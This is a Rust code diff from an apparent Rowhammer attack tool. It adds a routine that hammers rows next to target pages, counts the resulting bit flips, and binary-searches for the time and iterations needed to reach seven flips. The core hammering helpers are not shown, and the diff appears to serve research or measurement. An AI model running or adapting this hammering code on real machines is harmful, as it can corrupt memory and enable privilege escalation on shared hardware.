@@ -105,6 +105,79 @@ fn sanity_check_attack(pages: &[PageCandidate]) {
     }
 }
 
+fn check_attack(pages: &[PageCandidate], iterations: usize) -> (Duration, u64) {
+    for page in pages {
+        unsafe {
+            fill_memory(
+                page.target_page.virt_addr,
+                page.above_pages.0.virt_addr,
+                page.below_pages.0.virt_addr,
+            );
+            fill_memory(
+                page.target_page.virt_addr,
+                page.above_pages.1.virt_addr,
+                page.below_pages.1.virt_addr,
+            );
+        }
+    }
+
+    let start = Instant::now();
+
+    for _ in 0..iterations {
+        for page in pages {
+            rowhammer(page.above_pages.0.virt_addr, page.below_pages.0.virt_addr);
+        }
+    }
+
+    let elapsed = start.elapsed();
+
+    let total_flips: usize = pages
+        .iter()
+        .map(|page| count_flips_by_bit(&page.target_page, INIT_PATTERN).1.len())
+        .sum();
+
+    (elapsed, total_flips as u64)
+}
+
+pub(crate) fn check_attack_time_needed(pages: &[PageCandidate]) {
+    // Check upper limit of how many iterations are needed to get 7 flips
+    let mut iterations = 1 << 10;
+    let max_iterations_needed = loop {
+        let (_, flips) = check_attack(pages, iterations);
+
+        if flips >= 7 {
+            break iterations;
+        } else {
+            iterations *= 2;
+        }
+    };
+
+    // Reduce iterations to get more accurate time
+    let mut d_iterations = iterations / 4;
+    let mut iterations = max_iterations_needed - d_iterations;
+    let (time_needed, iterations_needed) = loop {
+        let (elapsed, flips) = check_attack(pages, iterations);
+
+        // If we didnt get enough flips, increase iterations. Else decrease.
+        if flips < 7 {
+            iterations += d_iterations;
+        } else {
+            iterations -= d_iterations;
+        }
+
+        if d_iterations == 1 {
+            break (elapsed.as_micros(), iterations);
+        } else {
+            d_iterations /= 2;
+        }
+    };
+
+    println!(
+        "Time needed for at least 7 flips: {} us, with {} iterations",
+        time_needed, iterations_needed
+    );
+}
+
 fn rowhammer_attack(pages: &[PageCandidate], number_of_dummy_pages: usize) {
     println!("Initializing pages for attack.");
 
@@ -370,7 +443,7 @@ pub(crate) fn main(
     if hammer {
         rowhammer_attack(&victims, number_of_dummy_pages);
     } else {
-        sanity_check_attack(&victims);
+        check_attack_time_needed(&victims);
     }
 
     println!("Done with attack");
